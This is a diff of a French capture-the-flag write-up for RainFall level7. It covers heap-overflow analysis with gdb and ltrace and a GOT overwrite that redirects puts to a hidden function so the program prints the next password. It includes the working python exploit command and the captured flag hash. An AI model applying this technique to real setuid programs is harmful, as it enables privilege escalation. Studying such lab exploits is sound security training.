@@ -1,73 +1,60 @@
-J'arrive sur le level7
-
-	level7@RainFall:~$ ls -la level7
-	-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
-	level7@RainFall:~$
-
-Il y a un programme level7 avec les droit de l'user level8
-
-J'envoie le fichier dans mon linux pour le decompiller avec cutter
-
 Le programme contient 2 fonction, une fonction main qui prend un parametre.
-La fonction main lie le contenue du fichier .pass et le stock dans une variable global contenue
-Le programme a une autre fonction qui n'est pas appeler et qui lie le contenue de la varaible global c.
+La fonction main lit le contenu du fichier .pass et le stock dans une variable globale via la fonction fgets.
+Le programme a une autre fonction qui n'est pas appelée et qui lit le contenue de la variable globale c.
 
-Il s'agit donc de trouver un moyen d'appeler la fonction M une fois que la fonction main a charger le contenu du fichier .pass.
+Il s'agit donc de trouver un moyen d'appeler la fonction M une fois que la fonction main a chargé le contenu du fichier .pass.
 
-
-Je vais dans un premier temp chercher a recuperer l'addresse de la fonction M
-
+On commence par chercher l'adresse de la fonction m
 
 	level7@RainFall:~$ gdb -q level7
 	Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
 	(gdb) disass m
 	Dump of assembler code for function m:
 	0x080484f4 <+0>:     push   %ebp
-	0x080484f5 <+1>:     mov    %esp,%ebp
-	0x080484f7 <+3>:     sub    $0x18,%esp
-	0x080484fa <+6>:     movl   $0x0,(%esp)
-	0x08048501 <+13>:    call   0x80483d0 <time@plt>
-	0x08048506 <+18>:    mov    $0x80486e0,%edx
-	0x0804850b <+23>:    mov    %eax,0x8(%esp)
-	0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
-	0x08048517 <+35>:    mov    %edx,(%esp)
-	0x0804851a <+38>:    call   0x80483b0 <printf@plt>
-	0x0804851f <+43>:    leave
-	0x08048520 <+44>:    ret
-	End of assembler dump.
-	(gdb)
 
-Le programme a bien segment fault mais il ne semble pas avoir réecrit EIP
-J'affiche donc les registre pour voir ce qui c'est passer.
+On va chercher l'offset du bufferoverflow
 
-level7@RainFall:~$ gdb -q level7
-Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
-(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
-Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+	(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+	Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 
-	Program received signal SIGSEGV, Segmentation fault.
-	0xb7eb0208 in ?? () from /lib/i386-linux-gnu/libc.so.6
-	(gdb) i r
-	eax            0x46464646       1179010630
-	ecx            0x0      0
-	edx            0x46464646       1179010630
-	ebx            0xb7fd0ff4       -1208152076
-	esp            0xbffff69c       0xbffff69c
-	ebp            0xbffff6c8       0xbffff6c8
-	esi            0x0      0
-	edi            0x0      0
-	eip            0xb7eb0208       0xb7eb0208
-	eflags         0x210286 [ PF SF IF RF ID ]
-	cs             0x73     115
-	ss             0x7b     123
-	ds             0x7b     123
-	es             0x7b     123
-	fs             0x0      0
-	gs             0x33     51
-	(gdb)
+		Program received signal SIGSEGV, Segmentation fault.
+		0xb7eb0208 in ?? () from /lib/i386-linux-gnu/libc.so.6
+		(gdb) info register
+		eax            0x46464646       1179010630
+		ecx            0x0      0
+		edx            0x46464646       1179010630
+		ebx            0xb7fd0ff4       -1208152076
+		esp            0xbffff69c       0xbffff69c
+		ebp            0xbffff6c8       0xbffff6c8
+		esi            0x0      0
+		edi            0x0      0
+		eip            0xb7eb0208       0xb7eb0208
+		eflags         0x210286 [ PF SF IF RF ID ]
+		cs             0x73     115
+		ss             0x7b     123
+		ds             0x7b     123
+		es             0x7b     123
+		fs             0x0      0
+		gs             0x33     51
+		(gdb)
 
-J'ai reecrit les registre EAX et EDX le buffer a crash au 20 charactere (46) F
-Je vais essayez de recrire changer l'addresse de retour de la fonction puts pour qu'elle redirige vers l'addresse de la fonction M
+Le programme a bien segment fault mais il ne semble pas avoir réecrit EIP.
+Etant donné que les variables dans lesquelles on insère des caractères ont été malloc, elles ne sont pas sur la stack mais sur la heap
+On affiche donc les registre pour essayer d'obtenir des informations supplémentaires.
+Les registres EAX et EDX ont été réécrits, le buffer a crash au 20eme caractère.
+
+On va tenter un ltrace pour avoir + de détails sur ce que fait le deuxieme param.
+	ltrace ./level7 "AAAABBBBCCCDDDDEEEEFFFF" "GGGG"
+	__libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
+	malloc(8)                                                                = 0x0804a008
+	malloc(8)                                                                = 0x0804a018
+	malloc(8)                                                                = 0x0804a028
+	malloc(8)                                                                = 0x0804a038
+	strcpy(0x0804a018, "AAAABBBBCCCCDDDDEEEEFFFF")                            = 0x0804a018
+	strcpy(0x46464646, "GGGG" <unfinished ...>
+
+On peut voir que le deuxième strcpy essaie d'écrire dans l'overflow effectué dans le premier.
+On pourrait donc essayer de modifier l'adresse GOT de la fonction puts, pour la faire pointer sur la fonction m qui va la remplacer lors de l'appel.
 
 	(gdb) info function puts
 	All functions matching regular expression "puts":
@@ -84,12 +71,15 @@ Je vais essayez de recrire changer l'addresse de retour de la fonction puts pour
 	0xb7f21fa0  putsgent
 	(gdb) disass 0x08048400
 	Dump of assembler code for function puts@plt:
-	0x08048400 <+0>:     jmp    *0x8049928
+	0x08048400 <+0>:     jmp    *0x8049928  <-------- adresse GOT
 	0x08048406 <+6>:     push   $0x28
 	0x0804840b <+11>:    jmp    0x80483a0
 	End of assembler dump.
 
- Je vais injecter mon bufferoverflow avec l'addresse de puts et en second argument l'addresse de la fonction M
+	(gdb) disass m
+	Dump of assembler code for function m:
+		0x080484f4 <+0>:     push   %ebp
 
-	./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
-	5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1606130489
+On a maintenant les deux adresses nous intéressant, on peut passer à l'injection.
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
